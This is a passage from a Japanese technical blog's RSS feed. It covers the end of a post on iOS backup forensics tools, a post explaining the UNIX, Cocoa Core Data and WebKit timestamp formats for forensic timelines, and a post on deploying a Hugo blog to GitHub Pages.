&lt;p&gt;&lt;code&gt;-o&lt;/code&gt;オプションを忘れてしまうとplistファイル自体の中身が書き換わってしまうので注意してください。&lt;br /&gt;
その他Pythonが利用できる環境であれば、&lt;code&gt;plistlib&lt;/code&gt;ライブラリが利用できるので、これを用いてプログラマブルに解析することも可能です。&lt;/p&gt;

&lt;h3 id=&#34;iexplorer&#34;&gt;iExplorer&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/Aogfu9Z&#34; alt=&#34;iExplorer&#34; /&gt;&lt;/p&gt;

&lt;p&gt;iExplorerは、高機能なiOSデバイスファイルブラウザーです。&lt;a href=&#34;https://macroplant.com/iexplorer&#34;&gt;iExplorer&lt;/a&gt; よりダウンロードできます。iExplorerは、Manifest.dbなどの情報を自動でパースし、より人間にわかりやすい形で表示してくれます。正直これがあれば、バックアップデータの閲覧には困らないと思います。全体的に眺めたい際などは、こちらを使って足りない場合、前述した&lt;code&gt;plutil&lt;/code&gt;コマンドなどを使って解析します。同様のツールとして&lt;code&gt;iBackupBot&lt;/code&gt;や&lt;code&gt;iBackup Viewer&lt;/code&gt;などがあるので、使い比べてみて自分にあったものを使うと良いでしょう。&lt;/p&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;今回は、iOSの基本構造やバックアップデータを用いた解析方法などについて簡単にご紹介しました。次は、気が向けば個々のアーティファクトについてより詳細にとりあげて記事を今度書こうかなと思っています。&lt;/p&gt;

&lt;h2 id=&#34;参考資料&#34;&gt;参考資料&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.packtpub.com/networking-and-servers/practical-mobile-forensics-third-edition&#34;&gt;Practical Mobile Forensics - Third Edition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>フォレンジックのためのシステム時刻入門</title>
      <link>https://owlinux1000.github.io/blog/post/system_time_for_forensics/</link>
      <pubDate>Sat, 23 Feb 2019 20:37:24 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/system_time_for_forensics/</guid>
      <description>

&lt;ul&gt;
&lt;li&gt;フォレンジックなどをやっていると様々な時刻形式と直面することがあります。いざ調べてみると時刻形式は、プラットフォームによって異なる場合が多いことに気づきました。時刻の情報はタイムライン作成では、とても重要な要因となってくるので、適切に時刻を解釈することが必要です。本記事では、よく見る3つの時刻表記についてご紹介します。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;unix-time&#34;&gt;UNIX time&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;UNIX timeはDFIRだけに限らず多くの場面でよく見かける時刻形式の1つです。&lt;strong&gt;UTC（協定世界時）の1970年1月1日0時0分0秒からの経過秒数&lt;/strong&gt;で表す時刻形式です。主要なプログラミング言語の代表的な時刻を扱うライブラリなどでは、UNIX timeをサポートしています。例えばRubyでは以下の様に、UNIX timeを扱うことができます。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;time&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#800&#34;&gt;JST_OFFSET&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;3600&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;9&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Time&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;parse(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1970-01-01 00:00:00&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;JST_OFFSET&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 0&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Time&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;at(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#=&amp;gt; 1970-01-01 09:00:00 +0900&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;apple-cocoa-core-data-timestamp&#34;&gt;Apple Cocoa Core Data timestamp&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Apple Cocoa Core Data timestampは、主にMac OSやiOSで見かける時刻形式です。Cocoaとは、macOS用のフレームワークです。また、&lt;strong&gt;Mac absolute time&lt;/strong&gt;と表記されることもあります。本時刻形式は、&lt;strong&gt;UTCの2001年1月1日0時0分0秒からの経過秒数&lt;/strong&gt;で表す時刻形式です。UNIX timeとの差分は、&lt;strong&gt;978307200&lt;/strong&gt;なので、これを考慮すればUNIX timeからすぐ算出することができます。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;webkit-chrome-time&#34;&gt;WebKit/Chrome time&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;WebKit/Chrome timeは、Google Chrome、OperaやSafariなどのデータで使われている時刻形式です。本時刻形式は、&lt;strong&gt;UTCの1601年1月1日0時0分0秒からの経過マイクロ秒&lt;/strong&gt;で表す時刻形式です。UNIX timeなどと異なりマイクロ秒なので値が大きいという特徴があります。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;便利なツールやサイト&#34;&gt;便利なツールやサイト&lt;/h2&gt;

&lt;p&gt;以下の2つは、システム時刻変換をする際に、使いやすかったツールです。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.epochconverter.com/&#34;&gt;Epoch Converter&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;本記事で説明した時刻形式などは概ねカバーしているツールです&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.digital-detective.net/dcode/&#34;&gt;DCode&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Epoch Converterと同様の機能を有しているWindowsアプリケーション&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;参考文献&#34;&gt;参考文献&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.packtpub.com/networking-and-servers/practical-mobile-forensics-third-edition&#34;&gt;Practical Mobile Forensics - Third Edition&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>新年なのでHugo でGitHub Pages にデプロイ</title>
      <link>https://owlinux1000.github.io/blog/post/helloworld/</link>
      <pubDate>Wed, 02 Jan 2019 22:27:14 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/helloworld/</guid>
      <description>

&lt;ul&gt;
&lt;li&gt;あけましておめでとうございます。本年もよろしくお願いいたします。&lt;br /&gt;
新年なので、Hugo で技術ブログを作成してみました。私ははてなブログやMedium などいろいろサイトを持っているわけですが、このブログには自分の備忘録的なことを書いて行こうと思います。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;1-hugo-のインストールと事前準備&#34;&gt;1. Hugo のインストールと事前準備&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;まずはHugo をインストールし、使いたいテーマ(今回はoneというテーマ)をsubmoduleとして取り込む。今回は、GitHub に&lt;code&gt;blog&lt;/code&gt; というリポジトリを作成(アクセスする際には、&lt;code&gt;https://owlinux1000.github.io/blog/&lt;/code&gt;) して、GitHubの設定で &lt;strong&gt;masterブランチのdocs/&lt;/strong&gt; を公開対象として設定する。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;config.toml&lt;/code&gt; を編集する際には、&lt;code&gt;publishDir = &amp;quot;docs&amp;quot;&lt;/code&gt; を追加しておく。これはGitHub 側で公開するディレクトリを&lt;code&gt;docs&lt;/code&gt; にしているから。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ brew install hugo
$ hugo new site blog
$ cd blog
$ git init
$ cd themes
$ git submodule add https://github.com/resugary/hugo-theme-one one
$ cp one/exampleSite/config.toml ../../../
$ emacs config.toml # 適宜パラメータを修正する&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;2-記事作成&#34;&gt;2. 記事作成&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;hugo コマンドで記事を作成してまずは、server サブコマンドを使ってPreview を見てみる。大丈夫そうならGitHub にpushする&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;$ hugo new posts/helloworld &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# この記事&lt;/span&gt;
$ emacs content/posts/helloworld.md &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# draft: false に変更&lt;/span&gt;
$ hugo &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Webページを生成。これでdocsに吐かれる&lt;/span&gt;
$ hugo server &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# アクセスして見れるか確認する&lt;/span&gt;
$ git add .
$ git commit -m &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1st commit!&amp;#34;&lt;/span&gt;
$ git remote add origin git@github.com:owlinux1000/blog.git
$ git push -u origin master&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Hugo を初めて使ってみた感想として結構めんどくさくなかったと思った。ネット上見てるとCIでがんばったりいろいろ見ていたので、プロジェクトサイトでのデプロイにした。毎月1本程度では継続していきたい。&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
  </channel>
</rss>